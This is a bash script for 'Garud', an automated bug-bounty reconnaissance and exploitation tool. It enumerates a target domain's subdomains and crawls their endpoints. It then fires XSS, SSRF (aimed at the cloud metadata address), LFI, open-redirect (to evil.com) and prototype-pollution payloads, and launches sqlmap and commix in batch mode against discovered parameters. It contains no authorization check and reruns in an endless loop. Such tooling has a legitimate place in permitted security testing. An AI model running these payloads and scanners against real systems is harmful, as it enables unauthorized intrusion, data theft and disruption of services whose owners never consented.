#!/bin/bash
# coded by R0X4R
# Contributers: KathanP19 (https://github.com/KathanP19), f8al (https://github.com/f8al), theamanrawat (https://github.com/theamanrawat), remonsec (https://github.com/remonsec), simrotion13 (https://github.com/simrotion13)

# Check connection
wget -q --spider http://google.com
if [ $? -ne 0 ];then
    echo "Connect to internet before running Garud!"
    exit 1
fi

# Variables
domain=
outdir=
exclude=
threads=
blindxss=

# Colors
initColors() {
    RED="\e[31m"
    BOLD="\e[1m"
    NORMAL="\e[0m"
    GREEN="\e[92m"
    YELLOW="\e[93m"
    BLINK="\e[5m"
}

# Print usage
printUsage() {
    initColors
    echo -e "${RED}\n█▀▀ ▄▀█ █▀█ █░█ █▀▄"
    echo -e "█▄█ █▀█ █▀▄ █▄█ █▄▀"
    echo -e "${NORMAL}${BOLD}\ncoded by ${GREEN}R0X4R${NORMAL}${BOLD} in INDIA with ${RED}<3${NORMAL}"
    echo -e "\nExample Usage:"
    echo -e "garud [-d target.tld] [-o output destination] [-t threads] [-b blind xss URL] [-x OOS domains] \n"
    echo -e "FLags:"
    echo -e "  -d        Add your target (e.g -d target.tld)"
    echo -e "  -o        Write to output folder (e.g -o results/)"
    echo -e "  -t        Number of threads [Default: 100] (e.g. -t 300)"
    echo -e "  -b        Add your xss server for BXSS [Default: false] (e.g. -b test.xss.ht)"
    echo -e "  -x        Exclude out of scope domains [Default: false] (e.g. -x ~/oosdomains.txt)\n"
    exit 1
}

# Argument flags
while getopts ":b:d:o:h:t:x:" opt; do
    case "${opt}" in
        b)
            blindxss=${OPTARG} ;;

        d)
            domain=${OPTARG} ;;

        o)
            outdir=${OPTARG} ;;

        h)
            printUsage ;;

        t)
            threads=${OPTARG} ;;

        x)
            exclude=${OPTARG} ;;

        *)
            printUsage ;;
    esac
done

# Intial config
if [ -z "$domain" ]
    then
        echo -e "\n${NORMAL}${BOLD}[${RED}${BLINK}ERROR${NORMAL}${BOLD}] - Target not supplied.\n${NORMAL}"
        printUsage
fi

if [ -z "$outdir" ]
    then
        echo -e "\n${NORMAL}${BOLD}[${RED}${BLINK}ERROR${NORMAL}${BOLD}] - Output destination not supplied.\n${NORMAL}"
        printUsage
fi

if [ -z "$threads" ]
    then
    threads=100
fi

if [ ! -d "$outdir" ]
    then
        mkdir -p $outdir
fi

cd $outdir

# Print banner
printBanner() {
	clear
    echo -e ${GREEN}"""\n	
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  v9XXXXXXXXXXXXXXXXXXXXXi-   -vOOO8b   d8OOOi-   -vXXXXXXXXXXXXXXXXXXXXXPi
    v9XXXXXXXXXXXPi v9XXi          v98v8Pi           vXXPi v9XXXXXXXXXXXPi
        -------       9X.          .db|db.          .XP       -------
                        )b.  .dbo.dPivviv9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXPi   .   v9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXbi   vXXXXXb.dX|Xb.dXXXXXi   vdXXP
                     vi      9XXXXXX(   )XXXXXXP      vi
                              XXXX X.vvi.X XXXX
                              XP^Xivb   divX^XX
                              X. 9  v   i  P )X
                              vb  v       i  di
                               v             i """

    echo -e "${RED}\n                             █▀▀ ▄▀█ █▀█ █░█ █▀▄"
    echo -e "                            █▄█ █▀█ █▀▄ █▄█ █▄▀"
    echo -e "${NORMAL}${BOLD}\n                        coded by ${GREEN}R0X4R${NORMAL}${BOLD} in INDIA with ${RED}<3${NORMAL}\n"
    sleep 1s
}

SECONDS=0

# Make folders to store output
makeFolders() {
    mkdir -p enumeration/
    mkdir -p enumeration/domains/
    mkdir -p enumeration/parameters/
    mkdir -p enumeration/patterns/
    mkdir -p injections/
    mkdir -p nuclei/
}

# Subdomain enumeration
subEnum() {
    echo -e "${BOLD}Starting subdomain enumeration of $domain${NORMAL}"
    curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | grep -o "\w.*$domain" | anew -q enumeration/domains/crt.txt &> /dev/null
    curl -s "https://api.hackertarget.com/hostsearch/?q=$domain" | grep -o "\w.*$domain" | anew -q enumeration/domains/hacker.txt &> /dev/null
    curl -s "https://riddler.io/search/exportcsv?q=pld:$domain" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep -o "\w.*$domain" | anew -q enumeration/domains/riddler.txt &> /dev/null
    assetfinder --subs-only $domain | anew -q enumeration/domains/assetfinder.txt &> /dev/null
    python3 ~/tools/Sublist3r/sublist3r.py -d $domain -o enumeration/domains/sublister.txt &> /dev/null
    subfinder -silent -d $domain -all -t $threads -o enumeration/domains/subfinder.txt > /dev/null
    amass enum -passive -d $domain -o enumeration/domains/amass.txt &> /dev/null
    crobat -s $domain | anew -q enumeration/domains/crobat.txt &> /dev/null
    ffuf -u http://FUZZ.$domain/ -t 200 -p 1.0-2.0 -w ~/wordlists/subdomains.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" -mc 200,404,403 -o ffuf.json -s &> /dev/null
    # Filter domains
    cat ffuf.json | jq -r '.results[] | {status:.status, host:.host} | select (.status == 200) | .host' 2> /dev/null | anew -q enumeration/domains/ffuf.txt &> /dev/null
    cat ffuf.json | jq -r '.results[] | {status:.status, host:.host} | select (.status == 404) | .host' 2> /dev/null | anew -q enumeration/domains/ffuf.txt &> /dev/null
    cat ffuf.json | jq -r '.results[] | {status:.status, host:.host} | select (.status == 403) | .host' 2> /dev/null | anew -q enumeration/domains/ffuf.txt &> /dev/null
    cat enumeration/domains/*.txt | grep -v "*" | sed '/@/d' | sed '/<BR>/d' | sed '/\_/d'| sed '/*/d' | grep "$domain" | anew -q tempdomains.txt
    # Finding second level domains
    cat tempdomains.txt | xargs -P 50 -I % bash -c "assetfinder --subs-only % | anew -q enumeration/domains/sldomains.txt" &> /dev/null
    # Filtering outofscope domains
    if [ -f "$exclude" ]
        then
            cat enumeration/domains/*.txt | grep -v "*" | grep -vf $exclude | sort -u | sed '/@/d' | sed '/<BR>/d' | sed '/\_/d'| sed '/*/d' | dnsx -t 100 -silent | anew -q enumeration/subdomains.txt &> /dev/null
        else
            cat enumeration/domains/*.txt | grep -v "*" | sort -u | sed '/@/d' | sed '/<BR>/d' | sed '/\_/d'| sed '/*/d' | dnsx -t 100 -silent | anew -q enumeration/subdomains.txt &> /dev/null
    fi
    xargs -a enumeration/subdomains.txt -P 50 -I % bash -c "echo % | httpx -silent -random-agent -tls-probe -csp-probe -threads 150 -ports 80,443,8080,8001,8009,280,591,583,832,981,1311,2480,4444,4445,4567,5000,5104,5800,7000,7001,7002,8008,8042,8088,8222,8243,8280,8281,8333,8530,8531,8887,8888,8443,8834,9080,9443,9981,12043,12046,16080,18091,10443,18092,81,300,593,1010,1311,2082,2087,2095,2096,3000,3128,3333,4243,4711,4712,4993,5108,6543,7396,7474,8000,8001,8008,8014,8069,8080,8081,8090,8091,8118,8123,8172,8443,8500,8880,8888,8983,9000,9043,9060,9090,9091,9200,9800,12443,20720,28017" 2> /dev/null | anew -q enumeration/liveurls.txt &> /dev/null
    xargs -a enumeration/subdomains.txt -P 50 -I % bash -c "echo % | httpx -silent -random-agent -tls-probe -csp-probe -threads 150 -ports 80,443,8080,8001,8009,280,591,583,832,981,1311,2480,4444,4445,4567,5000,5104,5800,7000,7001,7002,8008,8042,8088,8222,8243,8280,8281,8333,8530,8531,8887,8888,8443,8834,9080,9443,9981,12043,12046,16080,18091,10443,18092,81,300,593,1010,1311,2082,2087,2095,2096,3000,3128,3333,4243,4711,4712,4993,5108,6543,7396,7474,8000,8001,8008,8014,8069,8080,8081,8090,8091,8118,8123,8172,8443,8500,8880,8888,8983,9000,9043,9060,9090,9091,9200,9800,12443,20720,28017 -status-code -title" 2> /dev/null | anew -q enumeration/titles.txt &> /dev/null
    xargs -a enumeration/liveurls.txt -P 50 -I % bash -c "echo % | aquatone -chrome-path /snap/bin/chromium -out enumeration/aquatone/ -threads 10 -silent" 2> /dev/null &> /dev/null
    echo -e "Subdomain enumeration completed, total [passive:$(cat enumeration/domains/sldomains.txt | wc -l)  active:$(cat enumeration/subdomains.txt | wc -l)  activeurls:$(cat enumeration/liveurls.txt | wc -l)] found"
    echo -e "Subdomain enumeration completed, total [passive:$(cat enumeration/domains/sldomains.txt | wc -l)  active:$(cat enumeration/subdomains.txt | wc -l)  activeurls:$(cat enumeration/liveurls.txt | wc -l)] found" | notify -silent &> /dev/null
}

# Crawling subdomains
subCrawl() {
    echo -e "${BOLD}Crawling subdomains of $domain${NORMAL}"
    echo -e "Crawling subdomains of $domain" | notify -silent &> /dev/null
    gospider -S enumeration/liveurls.txt -d 10 -c 20 -t 50 -K 3 --no-redirect --js -a -w --blacklist ".(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt)" --include-subs -q -o enumeration/temp/gospider 2> /dev/null | anew -q enumeration/parameters/gospider.txt && rm -rf out/ &> /dev/null
    cat enumeration/liveurls.txt | xargs -P 50 -I % bash -c "echo % | waybackurls" 2> /dev/null | anew -q enumeration/parameters/wayback.txt &> /dev/null
    cat enumeration/liveurls.txt | gauplus --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt -t $threads -o enumeration/parameters/gauplus.txt &> /dev/null
    cat enumeration/parameters/*.txt | subjs -c 50 | parallel -j 20 'echo "{}" | python3 ~/tools/JSA/jsa.py' 2> /dev/null | anew -q enumeration/parameters/jslinks.txt &> /dev/null
    # Filtering all parameters
    cat enumeration/parameters/*.txt | grep $domain | sort -u | urldedupe -s | anew -q enumeration/endpoints.txt &> /dev/null
    # Filtering endpoints using gf patterns
    cat enumeration/endpoints.txt | gf xss | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/xss.txt
    cat enumeration/endpoints.txt | gf ssrf | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/ssrf.txt
    cat enumeration/endpoints.txt | gf ssti | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/ssti.txt
    cat enumeration/endpoints.txt | gf redirect | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/redirect.txt
    cat enumeration/endpoints.txt | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/sqli.txt
    cat enumeration/endpoints.txt | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/lfi.txt
    cat enumeration/endpoints.txt | gf rce | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/rce.txt
    cat ~/tools/payloads/sstipayloads.txt | while read -r line; do cat enumeration/patterns/ssti.txt | qsreplace "$line" 2> /dev/null | anew -q tempssti.txt;done
    cat ~/tools/payloads/lfipayloads.txt | while read -r line; do cat enumeration/patterns/lfi.txt | qsreplace "$line" 2> /dev/null | anew -q templfi.txt;done
    cat enumeration/patterns/ssrf.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" 2> /dev/null | anew -q tempssrf.txt
    cat enumeration/patterns/xss.txt | qsreplace "\">/><svg/onload=confirm(document.domain)>" 2> /dev/null | anew -q tempxss.txt
    cat enumeration/parameters/patterns/redirect.txt | qsreplace "http://www.evil.com/" 2> /dev/null | anew -q tempred.txt
}

# Starting nuclei scan on targets
nucScan() {
    echo -e "${BOLD}Scanning for vulnerabilites of $domain using nuclei${NORMAL}"
    echo -e "Scanning for vulnerabilites of $domain using nuclei" | notify -silent &> /dev/null
    xargs -a enumeration/liveurls.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity info -c 50 -silent" 2> /dev/null | anew -q nuclei/info.txt | notify -silent &> /dev/null
    xargs -a enumeration/liveurls.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity low -c 50 -silent" 2> /dev/null | anew -q nuclei/low.txt | notify -silent &> /dev/null
    xargs -a enumeration/liveurls.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity medium -c 50 -silent" 2> /dev/null | anew -q nuclei/medium.txt | notify -silent &> /dev/null
    xargs -a enumeration/liveurls.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity high -c 50 -silent" 2> /dev/null | anew -q nuclei/high.txt | notify -silent &> /dev/null
    xargs -a enumeration/liveurls.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity critical -c 50 -silent" 2> /dev/null | anew -q nuclei/critical.txt | notify -silent &> /dev/null
    echo -e "${BOLD}Vulnerability scanning completed using nuclei, total $(cat nuclei/*.txt | sed '/[info]/d' | sed '/cors\|x\-frame\|general\-tokens\|header\-sqli\|header\-reflection\|pantheon\-takeover\|host\-header\-poisioning\|detect\-all\-takeovers\:\pantheon\.io\|2019\-7192\|2020\-19719/d' | wc -l) vulnerabilities found${NORMAL}"
    echo -e "Vulnerability scanning completed using nuclei, total $(cat nuclei/*.txt | sed '/[info]/d' | sed '/cors\|x\-frame\|general\-tokens\|header\-sqli\|header\-reflection\|pantheon\-takeover\|host\-header\-poisioning\|detect\-all\-takeovers\:\pantheon\.io\|2019\-7192\|2020\-19719/d' | wc -l) vulnerabilities found" | notify -silent &> /dev/null
}

# Scanning for common injection vulnerabilities
injScan() {
    echo -e "${BOLD}Scanning for common injection vulnerabilities of $domain${NORMAL}"
    echo -e "Scanning for common injection vulnerabilities of $domain" | notify -silent &> /dev/null
    crlfuzz -l enumeration/liveurls.txt -c $threads -s | anew injections/crlf.txt | notify -silent &> /dev/null
    sed 's/$/\?__proto__[testparam]=exploit/' enumeration/liveports.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULN]"' 2> /dev/null | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | anew injections/proto.txt | notify -silent &> /dev/null
    cat enumeration/endpoints.txt | cut -d"?" -f1 | cut -d"=" -f1 | grep -iaE "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.temp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" | httpx -silent -follow-host-redirects | anew -q vulnerabilities/sensitivefiles.txt &> /dev/null
    xargs -a enumeration/patterns/xss.txt -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | anew -q injections/kxss.txt &>  /dev/null
    xargs -a tempssti.txt -P 50 -I % bash -c "curl -s -L -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"check-ssti49\" && echo -e \"[POTENTIAL SSTI] - % \n \"" 2> /dev/null | grep "POTENTIAL SSTI" | anew injections/ssti.txt | notify -silent &> /dev/null
    xargs -a tempxss.txt -P 50 -I % bash -c "curl -s -L -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"<svg/onload=confirm(document.domain)>\" && echo -e \"[POTENTIAL XSS] - % \n \"" 2> /dev/null | grep "POTENTIAL XSS" | anew injections/xss.txt | notify -silent &> /dev/null
    xargs -a tempssrf.txt -P 50 -I % bash -c "curl -ks -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"compute.internal\" && echo -e \"[POTENTIAL SSRF] - % \n \"" 2> /dev/null | grep "POTENTIAL SSRF" | anew injections/ssrf.txt | notify -silent &> /dev/null
    xargs -a templfi.txt -P 50 -I % bash -c "curl -s -L -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"root:x:\" && echo -e \"[POTENTIAL LFI] - host \n \"" 2> /dev/null | grep "POTENTIAL LFI" | anew injections/lfi.txt | notify -silent &> /dev/null
    xargs -a tempred.txt -P 50 -I % bash -c "curl -s -iL -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"Evil.Com - We get it...Daily\" && echo -e \"[POTENTIAL REDIRECT] - % \n \"" 2> /dev/null | grep "POTENTIAL REDIRECT" | anew injections/redirect.txt | notify -silent &> /dev/null
    xargs -a enumeration/patterns/sqli.txt -P 50 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --output-dir=injections/sqli/" 2> /dev/null &> /dev/null
    xargs -a enumeration/patterns/rce.txt -P 50 -I % bash -c "python3 ~/tools/commix/commix.py -u % --batch --output-dir injections/cmdin/" 2> /dev/null &> /dev/null
    if [ -n "$blindxss" ]; then
        dalfox file enumeration/patterns/xss.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -b $blindxss -w 100 -H "X-Bugbounty: Testing" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" 2> /dev/null | anew injections/dalfoxss.txt | notify -silent &> /dev/null
    else
        dalfox file enumeration/patterns/xss.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -w 100 -H "X-Bugbounty: Testing" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" 2> /dev/null | anew injections/dalfoxss.txt | notify -silent &> /dev/null
    fi
    echo -e "${BOLD}Common injection scan is completed of $domain${NORMAL}"
    echo -e "Common injection scan is completed of $domain" | notify -silent &> /dev/null
    rm -rf temp*
}

DURATION=$SECONDS

# Finishing things, removing temporary files
finScan() {
    echo -e "${BOLD}Scanning completed on $domain. Total $(($DURATION / 60)) min and $(($DURATION % 60)) seconds taken${NORMAL}"
    echo -e "Scanning completed on $domain. Total $(($DURATION / 60)) min and $(($DURATION % 60)) seconds taken" | notify -silent &> /dev/null
    echo -e "Output will saved in $(pwd)" | notify -silent &> /dev/null
    echo -e "Hii $(whoami), thanks for using Garud. Best of luck ;)" | notify -silent
    echo -e "${BOLD}Hii $(whoami), thanks for using Garud. Best of luck ;)${NORMAL}"
}

runGarud() {
    makeFolders
    subEnum
    subCrawl
    nucScan
    injScan
    finScan
    exit 1
}

while true
do
    initColors
    printBanner
    runGarud
done